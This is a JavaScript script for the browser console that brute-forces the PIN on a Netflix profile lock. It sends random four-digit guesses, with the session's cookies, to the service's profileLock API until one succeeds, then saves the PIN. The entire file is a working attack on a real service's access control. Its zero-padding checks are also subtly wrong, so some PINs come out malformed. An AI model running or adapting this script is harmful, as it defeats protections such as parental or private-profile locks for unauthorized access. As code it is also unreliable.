var found = false;

var authURL = ""; // copy from network tab request
var guid = ""; //// copy from network tab request


function randomIntFromInterval(min, max) { // min and max included 
  return Math.floor(Math.random() * (max - min + 1) + min)
}

async function bruteForceLogin(){
    var pin = "4273";

    const store = [];
    
    while(true){
      
      var randomNumber =  randomIntFromInterval(0,9999);
      console.log(randomNumber);
      if(randomNumber < 9){
          pin = "000" + randomNumber;
      }else if(randomNumber < 99){
          pin = "00" + randomNumber;
      }else if(randomNumber < 990){
          pin = "0" + randomNumber;
      }
      console.log("Number is "+ randomNumber);
      if(store.includes(pin)){
          console.log("Found in set " + pin);
        continue;
      }else{
        console.log("Trying " +  pin);
        var ans = await performLogin(pin);
        store.push(pin);
        console.log(ans);
        if(found){
            console.log("Got into account "+ pin);
            break;
        }
      }
    }
    
    console.log("pin is "+ pin);
}

async function performLogin(pin){
  await fetch("https://www.netflix.com/api/shakti/v9ac0b1cf/profileLock", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Accept": "application/json, text/javascript, */*",
        "Accept-Language": "en-CA,en-US;q=0.7,en;q=0.3",
        "X-Netflix.uiVersion": "v9ac0b1cf",
        "X-Netflix.esnPrefix": "NFCDFF-MC-",
        "X-Netflix.browserName": "Firefox",
        "X-Netflix.browserVersion": "96",
        "X-Netflix.osName": "Mac OS X",
        "X-Netflix.osFullName": "Mac OS X",
        "X-Netflix.osVersion": "10.15.0",
        "X-Netflix.playerThroughput": "24302.7",
        "X-Netflix.playerThroughputNiqr": "0.6561999024068431",
        "X-Netflix.clientType": "akira",
        "X-Netflix.esn": "esn",
        "Content-Type": "application/json",
        "X-Netflix.Client.Request.Name": "ui/xhrUnclassified",
        "x-netflix.request.client.user.guid": "client guid",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    },
    "referrer": "https://www.netflix.com/browse",
     "body": "{\"pin\":\""+pin+"\",\"action\":\"verify\",\"guid\":\""+guid+"\",\"authURL\":\""+authURL+"\"}",
    "method": "POST",
    "mode": "cors"
}).then(function(response)
     {
      if(response.status!==200)
       {
          console.log(response.status);
          return false;
       }else{
         console.log("Success "+ response.status + " - " +  pin);
         localStorage.setItem("Pin", pin);
         found = true;
         return true;
       }
     });
}

